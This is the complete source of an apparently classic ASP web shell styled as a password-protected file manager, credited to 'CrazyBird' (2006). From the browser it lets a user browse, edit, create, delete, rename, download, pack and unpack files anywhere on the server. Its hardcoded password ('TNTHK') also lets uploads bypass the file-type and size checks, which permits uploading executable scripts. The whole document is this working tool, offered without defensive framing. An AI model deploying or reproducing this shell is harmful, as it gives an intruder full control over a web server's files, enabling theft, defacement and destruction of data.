<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">
<!--
a {
 font-size: 9pt;
 color: #3300CC;
 text-decoration: none;
}
body {
 font-size: 9pt;
 margin-left: 0px;
 margin-top: 0px;
 margin-right: 0px;
 margin-bottom: 0px;
 line-height: 20px;
 background-color: #FFFFFF;
}
td {
 font-size: 9pt;
 line-height: 20px;
}
.tx {
 border-color:#000000;
 border-left-width: 0px;
 border-top-width: 0px;
 border-right-width: 0px;
 border-bottom-width: 1px;
 font-size: 9pt;
 background-color: #EEEEEE;
}
.tx1 {
 font-size: 9pt;
 border: 1px solid;
 border-color:#000000;
 color: #000000;
}
table{font-size:9pt;font-family:宋体;color:#000;border-collapse:collapse;}
INPUT{BORDER-TOP-WIDTH:1px;BORDER-LEFT-WIDTH:1px;FONT-SIZE:12px;BORDER-BOTTOM-WIDTH:1px;BORDER-RIGHT-WIDTH:1px;}
FORM{PADDING-RIGHT:0px;PADDING-LEFT:0px;PADDING-BOTTOM:0px;MARGIN:0px;PADDING-TOP:0px}
-->
</style>
<%
Server.ScriptTimeout = 999
action = Request("action")
temp = Split(Request.ServerVariables("PATH_INFO"), "/")
url = temp(UBound(temp))

Const pass = "TNTHK"'
Call ChkLogin()

Set fso = CreateObject("Scripting.FileSystemObject")

Select Case action
    Case "新建文件"
        Call fileform(Request("path")&"\")
    Case "savefile"
        Call savefile(Request("filename"), Request("content"), Request("filename1"))
    Case "新建文件夹"
        Call newfolder(Request("path")&"\")
    Case "savefolder"
        Call savefolder(Request("foldername"))
    Case "编辑"
        Call edit(Request("f"))
    Case "重命名"
        Call renameform(Request("f"))
    Case "saverename"
        Call rename(Request("oldname"), Request("newname"))
    Case "剪切"
        session("f") = request("f")
        Response.Redirect(url&"?foldername="&Request("path"))
    Case "粘贴"
        Call affix(Request("path")&"\")
    Case "删除"
        Call Delete( request("f"), Request("path") )
    Case "uploadform"
        Call uploadform(Request("filepath"),Request("path"))
    Case "saveupload"
        Call saveupload()
    Case "下载"
        Call download(request("f"))
    Case "打包"
        Dim Str, s, s1, s2, rep
        Call Dabao( Request("f"),Request("path") )
    Case "解包"
        Call Jiebao(Request("f"),Request("path"))
    Case "退出"
        Call logout()
    Case Else
        Path = Request("foldername")
        If Path = "" Then Path = server.MapPath("./")
        ShowFolderList(Path)
End Select
Set fso = Nothing

'列出文件和文件夹

Function ShowFolderList(folderspec)
    temp = Request.ServerVariables("HTTP_REFERER")
    temp = Left(temp, Instrrev(temp, "/"))
    temp1 = Len(folderspec) - Len(server.MapPath("./")) -1
    If temp1>0 Then
        temp1 = Right(folderspec, CInt(temp1)) + "\"
    ElseIf temp1 = -1 Then
        temp1 = ""
    End If
    tempurl = temp + Replace(temp1, "\", "/")
    uppath = "./" + Replace(temp1, "\", "/")
    upfolderspec = fso.GetParentFolderName(folderspec&"\")
    Set f = fso.GetFolder(folderspec)
%><center><br>
<form name="form1" method=post action="">
<input type="hidden" name="path" class="tx1" value="<%= folderspec%>">
<input type="submit" name="action" class="tx1" value="新建文件夹">
<input type="submit" name="action" class="tx1" value="新建文件">
<input type="button" value="向上" class="tx1" onclick="location.href='<%= url%>?foldername=<%= replace(upfolderspec,"\","\\")%>'">
<input type="button" value="返回" class="tx1" onclick="location.href='<%= url%>'">
<input type="submit" name="action" class="tx1" value="重命名">
<input type="submit" name="action" class="tx1" value="编辑">
<input type="button" name="action" class="tx1" value="上传" onClick="javascript:window.open('<%= url%>?action=uploadform&filepath=<%= uppath%>&path=<%= replace(folderspec,"\","\\")%>','new_page','width=600,height=260,left=100,top=100,scrollbars=auto');return false;">
<input type="submit" name="action" class="tx1" value="下载">
<input type="submit" name="action" class="tx1" value="打包" onclick="return confirm('确认打包吗?');">
<input type="submit" name="action" class="tx1" value="解包" onclick="return confirm('确认解包吗?');">
<input type="submit" name="action" class="tx1" value="剪切">
<input type="submit" name="action" class="tx1" value="粘贴" onclick="return confirm('确认粘贴吗?');" <%if session("f")="" or isnull(session("f")) then response.write(" disabled") %>>
<input type="submit" name="action" class="tx1" value="删除" onclick="return confirm('确认删除吗?');">
<input type="submit" name="action" class="tx1" value="退出" onclick="return confirm('确认退出吗?');"></center><br>
<table width="98%" align=center border="1" cellpadding="0" cellspacing="0" bordercolor="#000">
  <tr bgcolor="#CCCCCC" height="24">
<td width="30" align="center"><input type="checkbox" name="chkall" onclick="for (var i=0;i<form1.elements.length;i++){var e = form1.elements[i];if (e.type == 'checkbox')e.checked = form1.chkall.checked;}"></td>
    <td align="center" width="500">文件名称</td>
    <td width="100" align=center>容量大小</td>
    <td width="80" align="center">文档类型</td>
    <td width="150"  align="center">修改时间</td>
  </tr>
<%
'列出目录
Set fc = f.SubFolders
For Each f1 in fc
%>
  <tr bgcolor="#EFEFEF" onmouseover=this.bgColor='#ffffff'; onmouseout=this.bgColor='#EEEEEE'; height="24">
    <td align=center><center><input type="checkbox" name="f" value="<%= folderspec&"\"&f1.name%>"></center></td>
    <td>&nbsp;<a href="<%=url%>?foldername=<%=folderspec%>\<%=f1.name%>"><%=f1.name%></a></td>
    <td>&nbsp;<%=f1.size%> K</td>
    <td align=center>文件夹</td>
    <td>&nbsp;<%=f1.datelastmodified%></td>
  </tr>
<%
Next
'列出文件
Set fc = f.Files
For Each f1 in fc
%>
  <tr bgcolor="#EFEFEF" onmouseover=this.bgColor='#ffffff'; onmouseout=this.bgColor='#EEEEEE'; height="24">
    <td ><center><input type="checkbox" name="f" value="<%=folderspec&"\"&f1.name%>"></center></td>
    <td>&nbsp;<a href="<%=tempurl+f1.name%>" target="_blank"><%=f1.name%></a></td>
    <td>&nbsp;<%=f1.size%> K</td>
    <td align=center>文&emsp;件</td>
    <td>&nbsp;<%=f1.datelastmodified%></td>
  </tr>
<%
Next
%>
<tr height="24" bgcolor="#EFEFEF">
<td COLSPAN=5 align=center>空间全部大小：<%= formatnumber(f.size/1024,2)%>K</td></tr></table></form>
<%
End Function
'保存文件
Function savefile(filename, content, filename1)
    If Request.ServerVariables("PATH_TRANSLATED")<>filename Then
  Set f1 = fso.OpenTextFile(filename, 2, true)
  f1.Write(content)
  f1.Close
    End If
    Response.Redirect(url&"?foldername="&fso.GetParentFolderName(filename))
End Function

'文件表单

Function fileform(filename)
 If fso.FileExists(filename) Then
  Set f1 = fso.OpenTextFile(filename, 1, true)
  content = server.HTMLEncode(f1.ReadAll)
  f1.Close
 End If
%>
<form name="form1" method="post" action="<%= url%>?action=savefile">
<center><input name="filename" type="text" class="tx" style="width:100%" value="<%= filename%>"><textarea name="content" wrap="VIRTUAL" class="tx" style="width:100%;height:100%;font:Arial,Helvetica,sans-serif;" onKeyUp="style.height=this.scrollHeight;"><%= content%></textarea><input type="submit" class="tx1" onclick="return confirm('保存 '+filename.value+' ?');" value="保存"><input type="reset" class="tx1" value="重置"></center>
</form>
<%
End Function

'保存文件夹

Function savefolder(foldername)
 Set f = fso.CreateFolder(foldername)
 Response.Redirect(url&"?foldername="&f)
End Function

'新文件夹

Function newfolder(foldername)
    folderform foldername
End Function

'文件夹表单

Function folderform(foldername)
%>
<form method="post" action="<%= url%>?action=savefolder">
<center><input name="foldername" type="text" size="100" value="<%= foldername%>"><input type="submit" class="tx1" onclick="return confirm('保存 '+foldername.value+' ?');" value="保存"><input type="reset" class="tx1" value="重置"></center>
</form>
<%
End Function

'重命名表单
Function renameform(oldname)
%>
<form method=post action="">
<center>输入新的名字：<input type="hidden" name="oldname" value='<%= oldname%>'><input type="hidden" name="action" value="saverename"><input type="text" name="newname" value='<%= oldname%>' size="100"><input type="submit" class="tx1" value="提交修改"></center>
</form>
<%
End Function

'重命名

Function Rename(oldstr,newstr)
 oldname=split(oldstr,",")
 newname=split(newstr,",")
 for i=0 to ubound(oldname)
  If fso.FileExists(trim(oldname(i))) Then fso.MoveFile trim(oldname(i)), trim(newname(i))
  If fso.FolderExists(trim(oldname(i))) Then fso.MoveFolder trim(oldname(i)), trim(newname(i))
 next
    Response.Redirect(url&"?foldername="&fso.GetParentFolderName( oldname(0) ))
End Function

'粘贴

Function affix(path)
 oldname=split(session("f"),",")
 for i=0 to ubound(oldname)
  If fso.FileExists(trim(oldname(i))) Then fso.MoveFile trim(oldname(i)), path&fso.GetFileName(trim(oldname(i)))
  If fso.FolderExists(trim(oldname(i))) Then fso.MoveFolder trim(oldname(i)), trim(path)
 next
 session("f")=""
 Response.Redirect(url&"?foldername="&path)
End Function

'编辑

Function edit(f)
 If fso.FileExists(f) Then Call fileform(f)
 If fso.FolderExists(f) Then Call folderform( f )
End Function

'删除
Function Delete( str,path )
 For Each f In str
  If fso.FileExists(f) Then fso.DeleteFile(f)
  If fso.FolderExists(f) Then fso.DeleteFolder(f)
 Next
    Response.Redirect(url&"?foldername="&path)
End Function

'打包
Function Dabao( str,path )
 For Each f In str
  If fso.FolderExists(f) Then Call pack(f,path&"\")
 Next
    Response.Redirect(url&"?foldername="&path)
End Function

'解包
Function Jiebao( str,path )
 For Each f In str
  If fso.FileExists(f) and InStrRev(f,".yc")>0 and  Len(f)-InStrRev(f,".yc")=7 Then Install(f)
 Next
    Response.Redirect(url&"?foldername="&path)
End Function

'上传表单

Function uploadform(filepath,path)
%>
<div id=tdcent style='position:relative;left:0;top:0'>
<div id="waitting" style="position:absolute; top:100px; left:240px; z-index:10; visibility:hidden">
<table border="0" cellspacing="1" cellpadding="0" bgcolor="0959AF">
<tr><td bgcolor="#FFFFFF" align="center">
<table width="160" border="0" height="50">
<tr><td valign="top" class="g1"><div align="center">操&nbsp;作&nbsp;执&nbsp;行&nbsp;中<br>请稍候... </div></td></tr>
</table>
</td></tr>
</table>
</div></div>
<div id="upload" style="visibility:visible">
<form name="form1" method="post" action="<%= url%>?action=saveupload" enctype="multipart/form-data" >
  <table width="100%" height="24" border="1" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" bordercolorlight="#FFFFFF" bordercolordark="#000000">
    <tr bgcolor="#CCCCCC"><td bgcolor="#CCCCCC">文件上传
      <input type="hidden" name="act" value="upload"></td>
    </tr>
    <tr align="left" bgcolor="#EEEEEE"><td>
<li>需要上传的个数：<input name="upcount" class="tx" value="1"><input type="button" class="tx1" onclick="setid();" value="设定">
<li>上传到：<input name="filepath" class="tx" value="<%= filepath%>" size="60"><input name="path" class="tx" size="60" value="<%= path%>" style="display='none'">使用绝对路径<input name="ispath" type="checkbox" value="true" onclick="if (checked){filepath.style.display='none';path.style.display='';}else{filepath.style.display='';path.style.display='none';}">
<li>防止覆盖自动重命名<input name="checkbox" type="checkbox" value="true" checked>
<li>密码：<input name="uppass" type="password" class="tx">
      </td></tr>
    <tr><td align="left" id="upid"></td></tr>
    <tr bgcolor="#EEEEEE"><td align="center" bgcolor="#EEEEEE">
          <input type="submit" class="tx1" onClick="exec();" value="提交">
          <input type="reset" class="tx1" value="重置">
          <input type="button" class="tx1" onClick="window.close();" value="取消">
        </td></tr>
  </table>
</form></div>
<script language="JavaScript">
function exec()
{
 waitting.style.visibility="visible";
 upload.style.visibility="hidden";
}
function setid()
{
 if(window.form1.upcount.value>0)
 {
  str='';
  for(i=1;i<=window.form1.upcount.value;i++)
  str+='文件'+i+':<input type="file" name="file'+i+'" style="width:400" class="tx1"><br>';
  window.upid.innerHTML=str+'';
 }
}
setid();
</script>
<%
End Function

'保存上传

Function saveupload()
    Const filetype = ".bmp.gif.jpg.png.rar.zip.txt."'允许上传的文件类型。以.分隔
    Const MaxSize = 5000000'允许的文件大小
    Dim upload, File, formName, formPath
    Set upload = New upload_5xsoft
    If upload.Form("filepath")<>"" Then
  If upload.Form("ispath")="true" then
   formPath = upload.Form("path")
  else
   formPath = Server.mappath(upload.Form("filepath"))
  end if
  If Right(formPath, 1)<>"\" Then formPath = formPath&"\"
        If fso.FolderExists(formPath)<>true Then
            fso.CreateFolder(formPath)
        End If
        For Each formName in upload.objFile
            Set File = upload.File(formName)
            temp = Split(File.FileName, ".")
            fileExt = temp(UBound(temp))
            If InStr(1, filetype, LCase(fileExt))>0 Or upload.Form("uppass") = pass Then
                If upload.Form("checkbox") = "true" Then
                    Randomize
                    ranNum = Int(90000 * Rnd) + 10000
                    filename = Year(Now)&Month(Now)&Day(Now)&Hour(Now)&Minute(Now)&Second(Now)&ranNum&"."&fileExt
                Else
                    filename = File.FileName
                End If
                If File.FileSize>0 And (File.FileSize<MaxSize Or upload.Form("uppass") = pass) Then
                    File.SaveAs formPath&filename
                End If
                Set File = Nothing
            End If
        Next
    End If
    Response.Write("<script language='javascript'>window.opener.location.reload();self.close();</script>")
    Set upload = Nothing
End Function

'下载文件

Function download(File)
if File="" then
response.write"<script>alert('提醒您！请选择文件后在使用此功能！');history.back();</script>"
response.end
end if

    temp = Split(File, "\")
    filename = temp(UBound(temp))
    Set s = CreateObject("adodb.stream")
    s.mode = 3
    s.Type = 1
    s.Open
    s.loadfromfile(File)
    data = s.Read
    If IsNull(data) Then
        response.Write "空"
    Else
        response.Clear
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=" & filename
        response.binarywrite(data)
    End If
    Set s = Nothing
End Function

'打包

Function pack(Folder,path)
    Randomize
    ranNum = Int(90000 * Rnd) + 10000
 set f1 = fso.GetFolder(Folder)
    filename = Year(Now)&Month(Now)&Day(Now)&Hour(Now)&Minute(Now)&Second(Now)&ranNum&"_"&f1.size

    Set s = server.CreateObject("ADODB.Stream")
    Set s1 = server.CreateObject("ADODB.Stream")
    Set s2 = server.CreateObject("ADODB.Stream")

    s.Open
    s1.Open
    s2.Open

    s.Type = 1
    s1.Type = 1
    s2.Type = 2

 rep = fso.GetParentFolderName(Folder&"\")'当前目录
 Str = "folder>0>"&Replace(Folder, rep, "")&vbCrLf'连目录一起打包
    Call WriteFile(Folder)

    s2.charset = "gb2312"
    s2.WriteText(Str)
    s2.Position = 0
    s2.Type = 1
    s2.Position = 0
    bin = s2.Read

    s1.Write(bin)
    s1.SetEOS
    s1.SaveToFile(path&filename&".yc")

    s.Close
    s1.Close
    s2.Close

    Set s = Nothing
    Set s1 = Nothing
    Set s2 = Nothing
    response.Write("<a href='"&url&"?action=download&file="&server.mappath(filename&".yc")&"' target=_blank><font color=black>"&filename&".yc"&"</font></a>")
End Function

Function WriteFile(folderspec)
    Set f = fso.GetFolder(folderspec)
    Set fc = f.Files
    For Each f1 in fc
        If f1.Name<>"pack.asp" Then
            Str = Str&"file>"&f1.Size&">"&Replace(folderspec&"\"&f1.Name, rep, "")&vbCrLf
            s.LoadFromFile(folderspec&"\"&f1.Name)
            img = s.Read()
            If Not IsNull(img) Then s1.Write(img)
        End If
    Next
    Set fc = f.SubFolders
    For Each f1 in fc
        Str = Str&"folder>0>"&Replace(folderspec&"\"&f1.Name, rep, "")&vbCrLf
        WriteFile(folderspec&"\"&f1.Name)
    Next
End Function

'解包

function install(filename)
 tofolder=fso.GetParentFolderName(filename)
 t1=split(filename,"\")'得到文件全名
 t2=split(t1(ubound(t1)),".")'得到文件名
 t3=split(t2(0),"_")'得到数据大小
 size=cstr(t3(1))

 set s=server.createobject("adodb.stream")
 set s1=server.createobject("adodb.stream")
 set s2=server.createobject("adodb.stream")
 
 s.open
 s1.open
 s2.open
 
 s.type=1
 s1.type=1
 s2.type=1
 
 s.loadfromfile(filename)
 s.position=size
 s1.write(s.read)
 s1.position=0
 s1.type=2
 s1.charset="gb2312"
 s1.position=0
 a=split(s1.readtext,vbcrlf)
 s.position=0
 
 i=0
 while(i<ubound(a))
  b=split(a(i),">")
  if b(0)="folder" then
   if not fso.folderexists(tofolder&b(2)) then
    fso.createfolder(tofolder&b(2))
    'folder=split(tofolder&b(2),"\")'自动建立分层目录
    'for j=0 to ubound(folder)
     'newfolder=newfolder&folder(j)&"\"
     'if not fso.folderexists(newfolder) then
      'fso.createfolder(newfolder)
     'end if
    'next
   end if
  elseif b(0)="file" then
   if fso.fileexists(tofolder&b(2)) then
    fso.deletefile(tofolder&b(2))
   end if
   s2.position=0
   s2.write(s.read(b(1)))
   s2.seteos
   s2.savetofile(tofolder&b(2))
  end if
  i=i+1
 wend
 
 s.close
 s1.close
 s2.close
 set s=nothing
 set s1=nothing
 set s2=nothing
    Response.Write("<script language='javascript'>window.opener.location.reload();self.close();</script>")
end function

'检查登陆

Function ChkLogin()
 If Session("login") = "true" then
  Exit Function
 ElseIf Request("action") = "chklogin" Then
  If Request("password") = pass Then
   Session("login") = "true"
   Response.Redirect(url)
  Else
   Response.Write("<script>alert('登陆失败');</script>")
  End If
 End If
 Call LoginForm()
End Function

'登陆表单

Function LoginForm()
%>
<body onload="document.form1.password.focus();">
<br><br><br><br><br>
<form name="form1" method="post" action="<%= url%>?action=chklogin">
<center>请您输入密码：<input name="password" type="password" class="tx">
<input type="submit" class="tx1" value="登陆">
<br><br>
版权所有?2005-2006 设计工作室 当前版本：() V 1.0<br>
Power BY  CrazyBird<br>
&nbsp;编写于2006-12-3
</center>
</form>
</body>
<%
Response.End()
End Function

'注销

Function logout()
    Session.Abandon()
    Response.Redirect(url)
End Function
%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
   strForm=lcase(strForm)
   if not objForm.exists(strForm) then
     Form=""
   else
     Form=objForm(strForm)
   end if
 end function
Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
     set File=new FileInfo
   else
     set File=objFile(strFile)
   end if
 end function
Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  dim iFindStart,iFindEnd
  dim iFormStart,iFormEnd,sFormName
  Version="化境HTTP上传程序 Version 2.0"
  set objForm=Server.CreateObject("Scripting.Dictionary")
  set objFile=Server.CreateObject("Scripting.Dictionary")
  if Request.TotalBytes<1 then Exit Sub
  set tStream = Server.CreateObject("adodb.stream")
  set Data_5xsoft = Server.CreateObject("adodb.stream")
  Data_5xsoft.Type = 1
  Data_5xsoft.Mode =3
  Data_5xsoft.Open
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
  Data_5xsoft.Position=0
  RequestData =Data_5xsoft.Read 
  iFormStart = 1
  iFormEnd = LenB(RequestData)
  vbCrlf = chrB(13) & chrB(10)
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
  iStart = LenB (sStart)
  iFormStart=iFormStart+iStart+1
  while (iFormStart + 10) < iFormEnd 
 iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
 tStream.Type = 1
 tStream.Mode =3
 tStream.Open
 Data_5xsoft.Position = iFormStart
 Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
 tStream.Position = 0
 tStream.Type = 2
 tStream.Charset ="gb2312"
 sInfo = tStream.ReadText
 tStream.Close
 iFormStart = InStrB(iInfoEnd,RequestData,sStart)
 iFindStart = InStr(22,sInfo,"name=""",1)+6
 iFindEnd = InStr(iFindStart,sInfo,"""",1)
 sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
 if InStr (45,sInfo,"filename=""",1) > 0 then
  set theFile=new FileInfo
  iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
  iFindEnd = InStr(iFindStart,sInfo,"""",1)
  sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
  theFile.FileName=getFileName(sFileName)
  theFile.FilePath=getFilePath(sFileName)
  iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
  iFindEnd = InStr(iFindStart,sInfo,vbCr)
  theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
  theFile.FileStart =iInfoEnd
  theFile.FileSize = iFormStart -iInfoEnd -3
  theFile.FormName=sFormName
  if not objFile.Exists(sFormName) then
    objFile.add sFormName,theFile
  end if
 else
  tStream.Type =1
  tStream.Mode =3
  tStream.Open
  Data_5xsoft.Position = iInfoEnd 
  Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
  tStream.Position = 0
  tStream.Type = 2
  tStream.Charset ="gb2312"
         sFormValue = tStream.ReadText 
         tStream.Close
  if objForm.Exists(sFormName) then
    objForm(sFormName)=objForm(sFormName)&", "&sFormValue    
  else
    objForm.Add sFormName,sFormValue
  end if
 end if
 iFormStart=iFormStart+iStart+1
 wend
  RequestData=""
  set tStream =nothing
End Sub
Private Sub Class_Terminate  
 if Request.TotalBytes>0 then
 objForm.RemoveAll
 objFile.RemoveAll
 set objForm=nothing
 set objFile=nothing
 Data_5xsoft.Close
 set Data_5xsoft =nothing
 end if
End Sub
 Private function GetFilePath(FullPath)
  If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\\"))
  Else
   GetFilePath = ""
  End If
 End  function
 
 Private function GetFileName(FullPath)
  If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\\")+1)
  Else
   GetFileName = ""
  End If
 End  function
End Class
Class FileInfo
  dim FormName,FileName,FilePath,FileSize,FileType,FileStart
  Private Sub Class_Initialize 
    FileName = ""
    FilePath = ""
    FileSize = 0
    FileStart= 0
    FormName = ""
    FileType = ""
  End Sub
  
 Public function SaveAs(FullPath)
    dim dr,ErrorChar,i
    SaveAs=true
    if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
    set dr=CreateObject("Adodb.Stream")
    dr.Mode=3
    dr.Type=1
    dr.Open
    Data_5xsoft.position=FileStart
    Data_5xsoft.copyto dr,FileSize
    dr.SaveToFile FullPath,2
    dr.Close
    set dr=nothing 
    SaveAs=false
  end function
  End Class
</SCRIPT>
